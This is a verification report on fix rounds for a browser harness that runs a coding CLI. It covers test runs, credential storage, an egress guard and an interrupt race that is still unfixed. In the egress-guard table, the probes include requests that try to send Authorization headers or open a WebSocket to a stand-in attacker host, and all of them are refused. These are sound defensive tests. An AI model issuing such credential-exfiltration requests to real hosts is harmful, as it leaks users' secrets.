# claude-code-web: independent verification, round 2 (after fix rounds F1 and F2)

Verifier run on 2026-10-28, 01:57 to 02:15 UTC, on `d5c0dab` plus the
uncommitted F1 and F2 changes (44 changed or new files, all under
`packages/claude-code-web/`). I changed no source file and did not touch
STATUS.md; this report is the only file I added. The machine has 4 vCPUs.
Raw logs, JSON results, mock logs and my probe scripts are in
`<scratchpad>/v2/` (written `$V/` below). Every probe launches the
pre-installed Chromium with the same network-level egress block the e2e uses
(a dead loopback proxy, with only 127.0.0.1 bypassed, plus host-resolver
rules). Nothing in the research scratchpad was executed. The binary was only
read: it was dropped into the page, as the e2e does, and grepped once.

I treated both fix reports as wrong until I had reproduced them.

## Verdict

**Partial.**

- **Acceptance steps 1-6 and 2b pass.** They passed in 5 of 5
  `npm run test:e2e` runs, in one run under the Pages sub-path, and in one
  30-loop run.
- **Every F1 claim reproduces.** That includes the persistence limit F1
  declared itself: a reload within about 0.45 s of a write loses the write.
- **F2's credential, Worker-guard, allowlist, notice and test-path claims
  reproduce.**
- **F2 item 2, the interrupt race, is not fixed.**
  - F2's diagnosis of the transport is correct: the API stream is a direct
    `fetch` with the SDK's signal, not the http shim.
  - The race still happens. **3 of 143 interrupts were not applied:** 2 of 30
    in one traced `--interrupt-loops 30` run, and 1 of 40 in an instrumented
    probe.
  - In each failure the CLI answered the interrupt `control_request` with
    `success` within 1 ms. The SDK's AbortSignal stayed unaborted, and the
    21 s stream then ran to completion and ended in `success`.

No regressions found:
- unit tests went from 216 to 248, all passing;
- the build is clean;
- timings are in line with round 1.

## Commands run

```bash
cd /home/user/vibe-dump/packages/claude-code-web
npm test                                                     # $V/npm-test.log
npm run build                                                # $V/build.log
$V/loop.sh   # 5x: MOCK_LOG=$V/e2e<i>-mock.jsonl npm run test:e2e -- --json $V/e2e<i>.json --log $V/e2e<i>-page.log
MOCK_LOG=$V/loop30-mock.jsonl node test/e2e.mjs --trace --interrupt-loops 30 --json $V/loop30.json --log $V/loop30-page.log
node test/e2e.mjs --base /vibe-dump/claude-code-web/ --json $V/base.json
node test/e2e.mjs --fake --skip-extract
CC_RESEARCH_DIR=/nonexistent-research node --test test/unit/A-rewrites.test.mjs test/unit/A-extract.test.mjs
node $V/probe-a.mjs   # credentials, __cc, notice, base URL, two-tab lock, hard reload   -> $V/probe-a.json
node $V/probe-b.mjs   # real harness: refusals while running, stop->start, reload, Worker probe -> $V/probe-b.json
node $V/probe-c.mjs 0,0,250,500,1000,2000   # reload N ms after a write, no stop()/whenSaved() -> $V/probe-c.json
node $V/probe-d.mjs 40    # interrupt loop with a page-side timeline                -> $V/probe-d.json
node $V/probe-e.mjs 8 gc  # the same with two forced major GCs in the Worker first   -> $V/probe-e-gc.json
node $V/probe-f.mjs 60    # interrupt loop, every timeline kept                     -> $V/probe-f.json
node $V/maxwait.mjs       # fs.js onChange maxWaitMs in real time (dist build)
```

## Results at a glance

| check | result |
|---|---|
| `npm test` | 248 passed, 0 failed, 0 skipped, 30.9 s (round 1: 216). The real-binary test `acquire: ... report.zst.checked > 0` ran (2.4 s) and was not skipped |
| `npm run build` | exit 0, 3.5 s. `boot/` has 7 files (egress.js, errors.js and policy.js are new), vendor.js 408 KiB, dist 2.0 MB |
| `npm run test:e2e`, 5 runs in a row | 5/5 exit 0, each 11 passed, 0 failed, 0 skipped. 26.0, 26.8, 26.6, 28.0 and 27.4 s |
| `--base /vibe-dump/claude-code-web/` | 11/11, 26.5 s |
| `--fake --skip-extract` | 7 passed, 4 skipped (expected), 1.5 s |
| `--trace --interrupt-loops 30` | 10 passed, **1 failed (step 9: 26/30 by the e2e's count; 28/30 interrupts actually applied)**, 91.7 s |
| timings (5 runs) | extraction 4.6–5.4 s. Cold `system/init` 7.3, 7.8, 7.6, 8.0 and 8.2 s (initialize 7.1–7.9 s; limit 30 s). Warm 5.9, 6.3, 6.5, 6.9 and 6.5 s (limit 10 s). Sub-path run: 7.6 / 6.1 s. Loop run: 7.8 / 6.1 s |

## Acceptance steps

- **Step 1: PASS** in all 7 full runs and in probes B, C and D. The manifest
  has moduleCount 2848 and files 2846. The rewrites hit their pinned counts:
  - bunfs-root 241429
  - import-meta-require 529
  - import-meta-dir 9
  - builtin-hooks-helper 1
  - shell-search-gate 1
  - path-completer-readdir 2

  Probe B's manifest also has `zst: {checked: 137, unchecked: 0, needRewrite: []}`;
  round 1 had `unchecked: 137`. The e2e's reload check showed 0 extractions
  and the same `createdAt`.
- **Step 2: PASS.** Every real run's init listed the same 11 tools: Task,
  AskUserQuestion, Edit, ExitPlanMode, Glob, Grep, NotebookEdit, Read, Skill,
  Write and mcp__page__get_weather. MCP `page:connected`. Timings are in the
  table above.
- **Step 3: PASS, with the real preflight.**
  - In each of the 5 mock logs (`$V/e2e<i>-mock.jsonl`, written at request
    time), the first request the mock ever received was
    `OPTIONS /v1/messages?beta=true` (`i: 1`, `preflight.ok: true`). Its
    `access-control-request-headers` included
    `anthropic-dangerous-direct-browser-access` and `authorization`.
  - The first `POST /v1/messages?beta=true` (`i: 2`, scenario `hi`) followed
    3–6 ms later. In run 1 the OPTIONS came at 01:58:48.210Z and the POST at
    01:58:48.216Z.
  - Each whole run has exactly one OPTIONS: the 600 s preflight cache covers
    the later requests.
  - The `origin` header is the static server's.
  - The e2e reports '1 strict-CORS preflight ok, then 1 POST, beta ok,
    browser-access header ok' in every run.
- **Step 4: PASS** in every run: `handler({"city":"Paris"}) -> "Sunny in Paris, 21°C"`,
  and the result echoes it.
- **Step 5: PASS.** Every e2e run reports 'hello.txt listed before and after
  a reload without stop()' (e2e.mjs waits on `whenSaved()`, then calls
  `page.reload()`). Independently:
  - Probe C reloaded 621, 1115 and 2109 ms after the write's result, with no
    `stop()` and no `whenSaved()`. The file was kept every time, and the OPFS
    file `cc-web/home.ccwfs` contained `hello from the mock API`.
  - Shorter reloads lose the write; see F1 item 1 below.
- **Step 6: PASS.**
  - `foreign: []` in every run, and the e2e probe reported 'blocked'.
  - My probes record every context request to a host other than 127.0.0.1.
    Probes A and B recorded none. Probe B's netlog ends with only
    `POST http://127.0.0.1:<mock>/v1/messages/count_tokens` and the page
    origin. The refused requests never reached the network: they are absent
    from the netlog and from the mock's log.

## F1 claims

1. **Persistence races: verified, within the limit F1 declared.**
   - Unit tests 215–219 and 223–225 pass.
   - Probe B ran `stop()` and then `start()` at once. `stop()` took 109 ms.
     The new Worker's own fs-sync, from `refreshWorkspace()`, listed
     `hello.txt` with `"hello from the mock API\n"`, and OPFS contained it.
   - `maxwait.mjs` checked `onChange` on the built fs shim, with writes every
     100 ms for 5 s and a 400 ms debounce. With `maxWaitMs: 2000` it fired at
     2.10, 4.11 and 5.42 s. With `maxWaitMs: 0` it fired only at 5.42 s.
   - **Limit, now measured.** In probe C the pagehide flush rescued none of
     the short reloads:
     - Reloads 120 ms (twice) and 438 ms after the turn's result lost
       `hello.txt`. The OPFS file did not exist, and the listing was empty
       after the reload.
     - Reloads at 621 ms or later kept it.

     This is the "best fix not done" item (the Worker writing OPFS itself).
   - `navigator.storage.persist()` is checked by unit tests only.
2. **One tab at a time: verified** with probe A: two `?test` pages in one
   browser context.
   - Tab 1 had `lock: held`.
   - Tab 2 had `lock: other-tab`, and its status pill said 'open in another
     tab'.
   - Tab 2's `start()` and `clearWorkspace()` were both refused with "Claude
     Code is open in another tab of this site. Use that tab, or close it
     first: ...".
   - `navigator.locks.query()` showed one held and one pending
     `cc-web:home:exclusive`.
   - After tab 1 closed, tab 2 had `lock: held` within 23 ms. Its `start()`
     then got past the lock; it was refused only for the missing token, which
     a new tab does not have.
3. **e2e gaps: verified.**
   - `context.route` is gone.
   - The OPTIONS-before-POST evidence is under Step 3.
   - Step 5 reloads without `stop()`.
   - The egress probe is blocked.

   **But the step-9 diagnostics F1 promised do not come out on a real
   failure.**
   - In the loop run, the two non-applied interrupts (runs 4 and 21) printed
     only `page.evaluate: Error: timed out after 20000 ms waiting for a
     stream-json message`. The e2e waits 20 s, the slow stream lasts about
     21.2 s, and the `catch` returns before the "ran to completion / still
     streaming" check.
   - The late `success` of that turn was then caught by the *next* iteration,
     which failed with 'the interrupted turn ended in success' although its
     own stream was aborted (`aborted: true`, `sent: 3`).
   - So `--interrupt-loops` counts each real failure twice: 26/30 reported,
     28/30 actually applied.
4. **Service worker on hard reload: verified** with probe A.
   - After `Page.reload({ignoreCache: true})` over CDP, the page loaded
     **uncontrolled**: an init script recorded
     `navigator.serviceWorker.controller` as null.
   - `swReady` then resolved `{state: 'controlled'}`. The whole reload and
     ready took 141 ms; the old code waited 10 s and then blocked Start.
   - A normal reload loads controlled.
   - The classic fallback is gone (code, and unit test 227).
5. **No re-extraction while running: verified** with probe B, while Claude
   Code was running:
   - `extractFile(blob)` was refused with "Stop Claude Code before you
     extract again: the running process loads code from the cache.";
   - `clearCache()` was refused with the same message, for clearing;
   - `#binary-drop` was disabled, and the cache stayed `present`.
6. **Duplicate error reports: verified in the real Worker.**
   - Probe B booted the real `runtime/boot.js` with `manifest.entryUrl`
     pointing at a probe module, which runs after the whole boot sequence in
     place of `cli`.
   - The probe module threw one uncaught error and left one rejection
     unhandled.
   - The Harness `error` events were exactly
     `["probe-uncaught-error-1", "unhandled rejection: probe-unhandled-rejection-1"]`:
     one each.
   - `__cc.messages` (the getter) is what the e2e reads in every run.

## F2 claims

1. **Credentials: verified** with probe A, through the UI. It reads storage
   after each action:
   - **API key typed, "Remember" off.** localStorage `cc-web:settings` has no
     `apiKey` or `token` field. sessionStorage `cc-web:secrets` =
     `{"apiKey":"sk-ant-api03-VERIFY…","token":""}`.
   - **Token typed (oauth), "Remember" off.** localStorage still holds no
     secret. sessionStorage holds both.
   - **Remember ticked.** localStorage holds `apiKey` and `token`.
     sessionStorage is `{}`. A new tab gets the token back with the box
     ticked.
   - **Remember unticked.** localStorage loses both at once. sessionStorage
     holds both again.
   - **A plain visit in a new tab (no `?test`).**
     - `typeof window.__cc === 'undefined'` and no `__cc*` key on `window`.
     - The token and API-key fields are empty.
     - The header `#unofficial` reads "Unofficial; not affiliated with or
       endorsed by Anthropic", and the footer starts with the same sentence.
   - **Same-tab reload.** The token survives, and `hasCredential` is true.
   - **Migration.** A localStorage `{authMode:'oauth', token}` from an older
     build is moved to sessionStorage and removed from localStorage on load.
   - **`__cc.settings` is redacted.** It has no `apiKey`/`token` key and
     `hasCredential: true`.
   - e2e step 10 passed in every run.
2. **Interrupt race: NOT fixed.** The diagnosis holds, the hardening is real,
   and the race remains.
   - **Path, verified.** The loop run's trace has 71 API fetches, all
     `(direct, signal)`, and 0 `http-shim`. Successful interrupts abort the
     signal about 590 ms after dispatch, about 580 ms after a 200 response
     at 6–11 ms.
   - **Shim hardening.** Unit tests 54–58 (`http abort: ...`) pass. They
     cannot matter here, because the API stream never goes through the shim.
   - **Pass rate.** 140 of 143 interrupts were applied:

     | run | applied |
     |---|---|
     | plain e2e runs | 5/5 |
     | loop run | 28/30 |
     | probe D | 39/40 |
     | probe E (forced GC) | 8/8 |
     | probe F | 60/60 |

     The round-1 verifier saw 1 failure in 16; F2's 35/35 was a lucky draw
     at a rate of about 2 %.
   - **Failure mode.** The loop run's trace shows `fetch#15` and `fetch#48`
     with "signal aborted 21276 ms / 21348 ms after dispatch", which is the
     end of the stream, not the interrupt. Probe D's timeline of its failed
     run 25 (page clock, ms):
     - 24112 the page sends user "stream slowly";
     - 24124 `system/init`;
     - 24137 `fetch#49 POST /v1/messages (direct, signal)`; 24144 response 200;
     - 24716 the page sends `control_request interrupt`;
     - **24717 the CLI answers `control_response success`**;
     - no abort follows;
     - 44844 `assistant`, word1…word300;
     - 45443 the signal is aborted, 21306 ms after dispatch;
     - 45448 `result success`.

     A passing run looks the same up to the interrupt, then shows the signal
     aborted in the same millisecond as the `control_response`. It goes on
     to `result error_during_execution` and `command_lifecycle ... "state":"cancelled"`.

     So the CLI acknowledges the interrupt but does not cancel the running
     command. The browser fetch is not at fault.
   - **A hypothesis I tested and rejected.** The bundle links child
     AbortControllers to their parent through `WeakRef` plus a
     `FinalizationRegistry`, so GC could in principle break the chain.
     Probe E forced two major GCs (`--js-flags=--expose-gc`, `gc()` in the
     Worker) 500 ms into each stream, just before the interrupt: 8/8 applied.

     The cause is still unknown. A next round should look at how the CLI
     picks the controller an `interrupt` aborts, compared with the one
     passed to the stream. I could not tie the failures to the gap between
     the previous turn's end and the next prompt. Across probe F's 60
     passing runs that gap was 7–34 ms (median 12). Probe D did not record
     it for the failing run.
3. **Worker egress guard and policy env: verified in the real Worker.**
   Probe B's module ran inside the real boot sequence, with
   `ANTHROPIC_BASE_URL` = the mock.

   | request from inside the Worker | outcome |
   |---|---|
   | mock base URL + `authorization` (`POST /v1/messages/count_tokens`) | reached (200); the mock logged it |
   | page origin, no credential | reached (200) |
   | page origin + `authorization` | refused, `TypeError` `EGRESS_REFUSED`: "carries authorization to http://127.0.0.1:39905, which is not the API base URL" |
   | `https://api.anthropic.com` + `x-api-key` | refused `EGRESS_REFUSED` |
   | `https://evil.example/steal` + `Authorization` | refused `EGRESS_REFUSED` ("not the API base URL, https://api.anthropic.com or this page") |
   | `https://evil.example/` (no credential) | refused `EGRESS_REFUSED` |
   | `new Request('https://evil.example/r', {headers:{authorization}})` | refused `EGRESS_REFUSED` |
   | `new Request(api.anthropic.com, {headers: new Headers({'X-Api-Key'})})` | refused `EGRESS_REFUSED` |
   | api.anthropic.com, headers as `[['Authorization', ...]]` | refused `EGRESS_REFUSED` |
   | `https.request(api.anthropic.com, {headers:{'x-api-key'}})` (the http shim) | error `ECONNREFUSED` with `cause.code` `EGRESS_REFUSED` |
   | `new WebSocket('wss://evil.example/ws')` | threw `EGRESS_REFUSED` |

   - Nine `warn: egress guard: refused ...` lines reached the page log. Each
     names the header (`authorization`, `x-api-key`) but never its value.
   - The mock saw only `OPTIONS` and `POST /v1/messages/count_tokens`, with
     `Bearer probe-allowed`.
   - **Policy env.** The probe Harness was given an env with
     `DISABLE_TELEMETRY: '0'` and none of the other flags. Inside the Worker
     `process.env` had all four flags at `'1'`, so `workerEnv()` merges them
     last.
   - `globalThis.fetch` in the CLI's realm is the guard's `function fetch`.
   - No real e2e run's page log contains an egress refusal (0 in the 5 runs
     and in the loop run).
4. **Tool allowlist: verified at runtime for `--tools`.**
   - Init lists the same 11 tools in every real run. All are in
     `ALLOWED_TOOLS` or `mcp__page__*`.
   - Bash, WebFetch, WebSearch, RemoteTrigger and the Cron/Worktree tools
     are absent.
   - TodoWrite is allowed but not offered, which is harmless.
   - The Harness-side deny cannot be reached through the real CLI with
     `--tools`. It is covered by unit test 159 only: RemoteTrigger, Bash and
     `mcp__elsewhere__x` are denied without asking; `mcp__page__get_weather`
     and NotebookEdit still reach `canUseTool`.
5. **Notices and base URL: verified** with probe A.
   - The `#base-url-error` message:
     - `http://example.com`: shown, "must use https (plain http is allowed
       only for localhost / 127.0.0.1): example.com would receive your key or
       token unencrypted";
     - `http://192.168.1.5:8080`: shown;
     - `ftp://x`: shown;
     - `http://localhost:8080`, `http://127.0.0.1:<mock>` and
       `https://api.anthropic.com`: no message.
   - `__cc.start()` with `http://example.com` was refused with the same
     message.
   - The README opens with the "Unofficial; not affiliated with or endorsed
     by Anthropic" callout.
6. **Test paths and the .zst check: verified.**
   - With `CC_RESEARCH_DIR=/nonexistent-research`, A-rewrites and A-extract
     gave 6 passed, 7 skipped, 0 failed. The default run has 0 skipped.
   - No copy of the scratchpad path is left under `test/` except
     `test/research.mjs`.
   - In a real browser extraction, probe B's manifest shows
     `zst.checked: 137, unchecked: 0`.

## Regressions

None found.
- Unit tests went from 216 to 248 (+15 F1, +17 F2), with nothing removed or
  skipped.
- The build is clean.
- e2e timings compared with round 1:
  - cold 7.3–8.2 s (round 1: 6.9–8.3 s);
  - warm 5.9–6.9 s (5.8–6.8 s);
  - a whole run 26.0–28.0 s (23.7–27.1 s), which now includes step 10.
- `src/extract/rewrites.js` is unchanged; a grep for `tengu_` and `cch=`
  only hits its comments.
- `package.json` is unchanged.

## Still open

- **The interrupt race (reviewer finding [major] http.js).** About 2 % of
  interrupts are acknowledged but not applied, and the user keeps paying for
  output tokens until the stream ends. This is CLI-side behaviour, not the
  transport. See F2 item 2.
- **The e2e's step-9 loop** waits 20 s, less than the 21.2 s stream. A
  missed interrupt therefore reports a bare timeout, and the next iteration
  fails as well; see F1 item 3. Waiting more than about 22 s, and draining
  the late result before the next iteration, would fix both.
- **Persistence still depends on the page surviving the debounce.** A reload
  within about 0.45 s of a write loses it (probe C, 3 of 3), and the
  pagehide flush does not rescue it. F1 reported this as not done.
- **Not claimed by either round, and still as the reviewer found them:**
  - `public/sw.js` still serves from "the newest `cc-app-*` cache that has
    the key", with `current` pinned for its lifetime;
  - `extractFromBinary` still runs on the main thread;
  - ARCHITECTURE.md's acceptance step 6 ("the test intercepts") and its
    policy-posture line ("Tokens stay in localStorage/OPFS") keep the old
    wording, although the As-built section records the change.
